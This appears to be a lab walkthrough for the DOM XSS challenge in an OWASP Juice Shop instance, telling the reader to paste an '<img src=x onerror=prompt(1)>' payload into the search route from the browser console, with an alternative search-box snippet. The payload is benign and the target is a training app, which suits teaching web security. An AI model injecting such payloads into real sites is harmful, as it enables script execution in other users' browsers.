DOM XSS CHALLENGE - STEP BY STEP INSTRUCTIONS
=============================================

WHERE TO TYPE THE JAVASCRIPT CODE:

1. OPEN YOUR BROWSER
   - Go to: https://juice3.wonkatech.org
   - Make sure you're on the main Juice Shop page

2. OPEN THE DEVELOPER CONSOLE
   - Press F12 key
   OR
   - Mac: Press Cmd + Option + J
   - Windows/Linux: Press Ctrl + Shift + J
   
   A panel will open at the bottom or side of your browser

3. CLICK ON THE "CONSOLE" TAB
   - You'll see tabs like: Elements, Console, Sources, Network
   - Click on "Console"
   - You'll see a prompt that looks like: >

4. TYPE OR PASTE THE CODE
   At the > prompt, copy and paste this EXACT code:
   
   window.location.href = "#/search?q=<img src=x onerror=prompt(1)>"

5. PRESS ENTER KEY
   - A popup dialog will appear
   - Click OK or press Enter
   - The challenge will be marked as SOLVED!

ALTERNATIVE METHOD (if above doesn't work):
--------------------------------------------
In the same Console, paste this instead:

var searchBox = document.querySelector('input[type="search"]');
searchBox.value = '<img src=x onerror=prompt(1)>';
searchBox.form.submit();

Then press Enter.
